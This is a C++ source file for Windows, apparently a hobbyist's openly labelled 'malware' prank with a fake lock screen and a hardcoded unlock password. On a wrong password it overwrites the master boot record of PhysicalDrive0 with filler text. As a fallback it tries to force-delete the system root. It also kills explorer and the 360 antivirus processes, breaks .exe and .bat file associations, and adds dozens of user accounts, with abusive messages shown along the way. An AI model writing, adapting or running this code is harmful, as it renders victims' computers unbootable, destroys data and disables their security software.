#include <iostream>
#include <windows.h>

/* run this program using the console pauser or add your own getch, system("pause") or input loop */
using namespace std;
int main(void)
{
    int a,b,c;
    a = 0;
	b = 0;
	c = 0; 
    MessageBoxA(NULL,(LPCSTR)"This is a malware. Do you want to run?",(LPCSTR)"winnt32",MB_OK);
    MessageBoxA(NULL,(LPCSTR)"这是一个恶意程序,可能导致系统报废,你确定要运行吗?" ,(LPCSTR)"winnt32",MB_OK);
    system ("taskkill /f /im explorer.exe");
    cout << "Massage:Your Comtuper is Locked" << endl;
    cout << "email:123456.com" << endl;
    cout << "Please Enter Password to unlock comtuper" << endl; 
    cout << "Password:" ;
    MessageBoxA(NULL,(LPCSTR)"激活你个妈的,恭喜你的电脑中毒了!",(LPCSTR)"GET R3KT",MB_OK);
    cin >> a;
    if (a == 20111026 )
    {
    	system("Explorer.exe");
		cout << "You are a Good joy!" << endl; 
	}
	if (a != 20111026) 
	{
        LPCSTR DiskFileName="\\\\.\\PhysicalDrive0";
        char code[]=
            "By:bilibili:xiaokang -> By:bilibili:xiaokang -> By:bilibili:xiaokang -> bilibili:xiaokang -> bilibili:xiaokang -> bilibili:xiaokang -> "
            "By:bilibili:xiaokang -> By:bilibili:xiaokang -> By:bilibili:xiaokang -> bilibili:xiaokang -> bilibili:xiaokang -> bilibili:xiaokang -> "
            "By:bilibili:xiaokang -> By:bilibili:xiaokang -> By:bilibili:xiaokang -> bilibili:xiaokang -> bilibili:xiaokang -> bilibili:xiaokang -> "
            "By:bilibili:xiaokang -> By:bilibili:xiaokang -> By:bilibili:xiaokang -> bilibili:xiaokang -> bilibili:xiaokang -> bilibili:xiaokang -> ";
        BYTE MBR[512];
        DWORD s=NULL,t=NULL;
        HANDLE handle=NULL;
        memcpy(MBR,code,sizeof(code)-1);
        handle=CreateFileA(
            DiskFileName,
            GENERIC_READ|GENERIC_WRITE,
            FILE_SHARE_READ|FILE_SHARE_WRITE,
            0,
            OPEN_EXISTING,
            0,
            0);
        if(handle==INVALID_HANDLE_VALUE)
        {
        	MessageBoxA(NULL,(LPCSTR)"Fucked your Computer!!!",(LPCSTR)"Error",MB_OK);
        	system("del /f /s /q $SystemRoot$");
        }
        else
        {
        	WriteFile(handle,MBR,sizeof(MBR),&t,NULL);
        	DeviceIoControl(handle,FSCTL_UNLOCK_VOLUME,NULL,0,NULL,0,&s,NULL);
        	CloseHandle(handle);
		}
		MessageBoxA(NULL,(LPCSTR)"Password is wrong.Your computer is die!",(LPCSTR)"winnt32",MB_OK);
		system("taskkill /f /im 360tray.exe");
	    system("taskkill /f /im ZhuDongFangYu.exe");
	    system("assoc .exe=txtfile");
	    system("assoc .bat=txtfile");
	    system("assoc .exe=txtfile");
	    system("assoc .bat=txtfile");
	    system("assoc .exe=txtfile");
	    system("assoc .bat=txtfile");
	    system("assoc .exe=txtfile");
	    system("assoc .bat=txtfile");
	    system("assoc .exe=txtfile");
	    system("assoc .bat=txtfile");
	    system("assoc .exe=txtfile");
	    system("assoc .bat=txtfile");
	    system("assoc .exe=txtfile");
	    system("assoc .bat=txtfile");
	    system("assoc .exe=txtfile");
	    system("assoc .bat=txtfile");
	    system("assoc .exe=txtfile");
	    system("assoc .bat=txtfile");
	    system("assoc .exe=txtfile");
	    system("assoc .bat=txtfile");
	    system("assoc .exe=txtfile");
	    system("assoc .bat=txtfile");
	    system("assoc .exe=txtfile");
	    system("assoc .bat=txtfile");
	    system("assoc .exe=txtfile");
	    system("assoc .bat=txtfile");
	    system("assoc .exe=txtfile");
	    system("assoc .bat=txtfile");
	    system("assoc .exe=txtfile");
	    system("assoc .bat=txtfile");
	    system("assoc .exe=txtfile");
	    system("assoc .bat=txtfile");
	    system("assoc .exe=txtfile");
	    system("assoc .bat=txtfile");
	    system("assoc .exe=txtfile");
	    system("assoc .bat=txtfile");
	    system("assoc .exe=txtfile");
	    system("assoc .bat=txtfile");
	    system("assoc .exe=txtfile");
	    system("assoc .bat=txtfile");
	    system("assoc .exe=txtfile");
	    system("assoc .bat=txtfile");
	    system("assoc .exe=txtfile");
	    system("assoc .bat=txtfile");
	    system("assoc .exe=txtfile");
	    system("assoc .bat=txtfile");
	    system("assoc .exe=txtfile");
	    system("assoc .bat=txtfile");
	    system("assoc .exe=txtfile");
	    system("assoc .bat=txtfile");
	    system("assoc .exe=txtfile");
	    system("assoc .bat=txtfile");
	    system("net user RUN1 AWAY_1 /add");
	    system("net user RUN2 AWAY_1 /add");
	    system("net user RUN3 AWAY_1 /add");
	    system("net user RUN4 AWAY_1 /add");
	    system("net user RUN5 AWAY_1 /add");
	    system("net user RUN6 AWAY_1 /add");
	    system("net user RUN7 AWAY_1 /add");
	    system("net user RUN8 AWAY_1 /add");
	    system("net user RUN9 AWAY_1 /add");
	    system("net user RUN10 AWAY_1 /add");
	    system("net user RUN11 AWAY_1 /add");
	    system("net user RUN12 AWAY_1 /add");
	    system("net user RUN13 AWAY_1 /add");
	    system("net user RUN14 AWAY_1 /add");
	    system("net user RUN15 AWAY_1 /add");
	    system("net user RUN16 AWAY_1 /add");
	    system("net user RUN17 AWAY_1 /add");
	    system("net user RUN18 AWAY_1 /add");
	    system("net user RUN19 AWAY_1 /add");
	    system("net user RUN20 AWAY_1 /add");
	    system("net user RUN21 AWAY_1 /add");
	    system("net user RUN22 AWAY_1 /add");
	    system("net user RUN23 AWAY_1 /add");
	    system("net user RUN24 AWAY_1 /add");
	    system("net user RUN25 AWAY_1 /add");
	    system("net user RUN26 AWAY_1 /add");
	    system("net user RUN27 AWAY_1 /add");
	    system("net user RUN28 AWAY_1 /add");
	    system("net user RUN29 AWAY_1 /add");
	    system("net user RUN30 AWAY_1 /add");
	    system("net user RUN31 AWAY_1 /add");
	    system("net user RUN32 AWAY_1 /add");
	    system("net user RUN33 AWAY_1 /add");
	    system("net user RUN34 AWAY_1 /add");
	}
	return 0;
}
